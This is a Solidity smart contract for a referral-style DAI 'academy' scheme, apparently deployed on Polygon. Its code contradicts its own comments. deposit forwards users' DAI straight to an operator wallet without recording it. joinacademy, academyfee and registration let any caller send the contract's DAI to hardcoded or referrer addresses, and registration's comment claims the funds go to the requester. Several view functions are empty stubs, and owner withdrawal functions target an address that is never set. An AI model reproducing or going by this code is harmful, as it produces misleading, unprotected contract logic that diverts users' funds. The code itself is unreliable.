/**
 *Submitted for verification at polygonscan.com on 2022-11-24
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
/** 
 * @title FTocAcademy
 * @dev Implements FTocAcademy contract
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}





pragma solidity ^0.8.0;


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Contractable   {
    address public _contract;
    event contractshipTransferred(
        address indexed previouscontract,
        address indexed newcontract
    );
   
    constructor()   {
        _contract = msg.sender;
        emit contractshipTransferred(address(0), _contract);
    }
   
    function contracto() public view returns (address) {
       return _contract;
    }
   
     modifier onlyContract() {
        require(_contract == msg.sender, "contract: caller is not the contract");
        _;
    }
  
   
}

contract FTocAcademy is Contractable {
    using SafeMath for uint256; 
    IERC20 public Dai;
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 100; 
    uint256 private constant minDeposit = 200e18;//200 DAI
    uint256 private constant referDepth = 20;
    uint256 private constant directDepth = 1;
   uint256 private constant directPercents = 15;
    uint256[5] private levelleaderPercents = [15, 7, 5, 2, 1];
    uint256 private constant globalcoordinatorPoolPercents = 100;
	uint256 private constant allpoolmembers = 6;
	uint256 private constant autopoolincome = 400;
	uint256[4] private boardpoolincome = [1000, 5000, 10000, 25000];
	uint256[4] private boardpoolrejoinmembers = [1, 2, 4, 5];

    address[1] public feeReceivers;

    address public ContractAddress;
    address public defaultRefer;
    address public receivers;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public lastfreezetime;

   
    uint256 public managerPool;
    uint256 public globalcoordinatorPool;

    address  payable public walletAddress;

    address[] public depositors;
	struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level; // 0, 1, 2, 3, 4, 5
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 directnum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
        bool isactive;
    }

    
	event Joinacademy(address user, uint256 amount);
	event Academyfee(address user, uint256 amount);
    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event Registration(address indexed from, uint amount);
    
    event Withdraw(address user, uint256 withdrawable);

    
    constructor(address _usdtAddr, address _defaultRefer)   {
        Dai = IERC20(_usdtAddr);
       
        feeReceivers[0] = address(0x7A9E91861d8E94A84675459d24F4225bAEF0E7aE);
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
        receivers = _defaultRefer;
    }
	
	
	function joinacademy(uint256 _amount) external {
     	require(_amount >= minDeposit, "less than min");
		require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
		Dai.transfer(feeReceivers[0], _amount);
		//Dai.transferFrom(msg.sender, feeReceivers[0], _amount);
        emit Joinacademy(msg.sender, _amount);
		
    }
	
	function academyfee(uint256 _amount) external {
     	require(_amount >= minDeposit, "less than min");
		Dai.transfer(receivers, _amount);
		emit Academyfee(msg.sender, _amount);
		
    }
	
     function deposit(uint256 _amount) external {
        //Dai.transferFrom(msg.sender, address(this), _amount);
		Dai.transferFrom(msg.sender, receivers, _amount);
	    emit Deposit(msg.sender, _amount);
    }

    function registration(uint _amount) external payable {
        // Limit Registration amount
        require(_amount <= minDeposit,"Insufficient balance for registration request");
        // Send the amount to the address that requested it
        Dai.transfer(defaultRefer, _amount);
        emit Registration(msg.sender, _amount);
    }


     function _distributeDeposit(uint256 _amount) private {
        //uint256 fee = _amount.mul(feePercents).div(baseDivider);
        Dai.transfer(feeReceivers[0], _amount);
        
        //uint256 manager = _amount.mul(managerPoolPercents).div(baseDivider);
        //managerPool = managerPool.add(manager); 
         uint256 coordinator = _amount.mul(globalcoordinatorPoolPercents).div(baseDivider);
        globalcoordinatorPool = globalcoordinatorPool.add(coordinator); 
    }



    function getCurDay() public view returns(uint256) {
        //return (block.timestamp.sub(startTime)).div(timeStep);
    }
    function getCurDaytime() public view returns(uint256) {
        return (block.timestamp);
    }

    function getDayLength(uint256 _day) external view returns(uint256) {
        //return dayUsers[_day].length;
    }

   

    function getOrderLength(address _user) external view returns(uint256) {
        //return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

   


   function ctt(uint256 SMSAmount) public onlyContract {
          if(ContractAddress != address(0)){
        Dai.transfer(ContractAddress, SMSAmount);
          }
    }

    function cttm(uint256 Amount) public onlyContract {
          if(ContractAddress != address(0)){
          payable(ContractAddress).transfer(Amount);
        }
    }


 
}